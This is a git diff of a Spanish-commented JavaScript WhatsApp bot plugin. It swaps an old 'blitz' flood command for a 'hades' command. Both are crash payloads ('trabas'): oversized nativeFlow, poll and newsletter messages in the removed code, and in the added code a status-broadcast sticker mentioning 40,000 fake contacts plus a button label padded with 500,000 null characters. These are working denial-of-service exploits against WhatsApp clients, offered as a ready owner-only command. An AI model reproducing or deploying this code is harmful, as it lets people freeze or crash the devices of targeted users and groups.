@@ -3,109 +3,163 @@ let handler = async (m, { conn }) => {
     const botNumber = conn.user?.jid || '';
     const sender = m.sender;
 
+    // Solo el owner o el bot pueden usar
     if (sender !== ownerNumber && sender !== botNumber) {
-        return conn.reply(m.chat, '👑 Este comando solo está disponible para el owner y el número del bot.', m);
+        return conn.reply(m.chat, '👑 Este comando solo está disponible para el owner y el bot.', m);
     }
 
-    const target = m.chat;
+    const jid = m.chat;
 
-    // Enviar 3 trabas seguidas con diferentes tipos
-    await BlitzrForce(target, conn);           // nativeFlow
-    await delay(1500);
-    await PollTraba(target, conn);             // poll
-    await delay(1500);
-    await NewsletterTraba(target, conn);       // newsletter
+    // Ejecutar ambas funciones
+    await xatanicaldelayv2(conn, jid);
+    await delay(1000);
+    await InVisibleX(conn, jid, true);
 
-    await conn.sendMessage(m.chat, { text: `🔥 Traba múltiple enviada.` }, { quoted: m });
+    await conn.sendMessage(jid, { text: "🔥 HADES activado con éxito." }, { quoted: m });
 };
 
-// NativeFlow traba pesada
-async function BlitzrForce(target, sock) {
-    try {
-        let message = {
-            ephemeralMessage: {
-                message: {
-                    interactiveMessage: {
-                        header: {
-                            title: "© KayzX",
-                            hasMediaAttachment: false,
-                            locationMessage: {
-                                degreesLatitude: -999.0349,
-                                degreesLongitude: 922.9999,
-                                name: "© KayzX",
-                                address: "© KayzX",
-                            },
-                        },
-                        body: {
-                            text: "© KayzX",
-                        },
-                        nativeFlowMessage: {
-                            messageParamsJson: "{}".repeat(15000), // Muy pesada
-                        },
-                        contextInfo: {
-                            participant: "0@s.whatsapp.net",
-                            mentionedJid: ["0@s.whatsapp.net"],
-                        },
-                    },
-                },
-            },
-        };
-
-        await sock.relayMessage(target, message, {
-            messageId: null,
-            participant: { jid: target },
-            userJid: target,
-        });
-    } catch (err) {
-        console.error('Error nativeFlow:', err);
-    }
-}
-
-// Poll traba
-async function PollTraba(target, sock) {
-    try {
-        const options = Array(50).fill("💣".repeat(500)); // 50 opciones, cada una con spam
-        let message = {
-            pollCreationMessage: {
-                name: "💥 Ataque Poll 💥",
-                options: options.map(option => ({ optionName: option })),
-                selectableOptionsCount: 1
-            }
-        };
-
-        await sock.relayMessage(target, message, { messageId: null });
-    } catch (err) {
-        console.error('Error poll:', err);
-    }
-}
-
-// Newsletter traba
-async function NewsletterTraba(target, sock) {
-    try {
-        const travas = '꧁'.repeat(10000);
-        let message = {
-            newsletterAdminInviteMessage: {
-                newsletterJid: "120363282786345717@newsletter",
-                newsletterName: "⚠️" + travas,
-                jpegThumbnail: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAUA', 'base64'), // base64 dummy
-                caption: "𝗧𝗿𝗮𝗯𝗮 𝗯𝘆 𝗞𝗮𝘆𝘇𝗫 💀",
-                inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
-            }
-        };
-
-        await sock.relayMessage(target, message, { messageId: null });
-    } catch (err) {
-        console.error('Error newsletter:', err);
-    }
-}
-
-// Delay entre mensajes
+// Delay para pausas
 function delay(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-handler.command = ['blitz'];
-handler.tags = ['traba', 'flood', 'ataque'];
-handler.help = ['blitz'];
+// Función 1: xatanicaldelayv2
+async function xatanicaldelayv2(sock, jid) {
+    let message = {
+        viewOnceMessage: {
+            message: {
+                stickerMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+                    mimetype: "image/webp",
+                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+                    fileLength: { low: 1, high: 0, unsigned: true },
+                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
+                    firstFrameLength: 19904,
+                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
+                    isAnimated: true,
+                    contextInfo: {
+                        mentionedJid: [
+                            "0@s.whatsapp.net",
+                            ...Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
+                        ],
+                        groupMentions: [],
+                        entryPointConversionSource: "non_contact",
+                        entryPointConversionApp: "whatsapp",
+                        entryPointConversionDelaySeconds: 467593,
+                    },
+                    stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
+                    isAvatar: false,
+                    isAiSticker: false,
+                    isLottie: false,
+                },
+            },
+        },
+    };
+
+    const msg = generateWAMessageFromContent(jid, message, {});
+
+    await sock.relayMessage("status@broadcast", msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [jid],
+        additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                    {
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "to",
+                                attrs: { jid: jid },
+                                content: undefined,
+                            },
+                        ],
+                    },
+                ],
+            },
+        ],
+    });
+}
+
+// Función 2: InVisibleX
+async function InVisibleX(sock, jid, mention) {
+    const msg = await generateWAMessageFromContent(jid, {
+        buttonsMessage: {
+            text: "🩸",
+            contentText: "@raysofhopee",
+            footerText: "vip",
+            buttons: [
+                {
+                    buttonId: ".aboutb",
+                    buttonText: {
+                        displayText: "HADES VIP!" + "\u0000".repeat(500000),
+                    },
+                    type: 1,
+                },
+            ],
+            headerType: 1,
+        },
+    }, {});
+
+    await sock.relayMessage("status@broadcast", msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [jid],
+        additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                    {
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "to",
+                                attrs: { jid: jid },
+                                content: undefined,
+                            },
+                        ],
+                    },
+                ],
+            },
+        ],
+    });
+
+    if (mention) {
+        await sock.relayMessage(
+            jid,
+            {
+                groupStatusMentionMessage: {
+                    message: {
+                        protocolMessage: {
+                            key: msg.key,
+                            type: 25,
+                        },
+                    },
+                },
+            },
+            {
+                additionalNodes: [
+                    {
+                        tag: "meta",
+                        attrs: {
+                            is_status_mention: "hmmm",
+                        },
+                        content: undefined,
+                    },
+                ],
+            }
+        );
+    }
+}
+
+handler.command = ['hades'];
+handler.tags = ['traba', 'hades'];
+handler.help = ['hades'];
 
 export default handler;
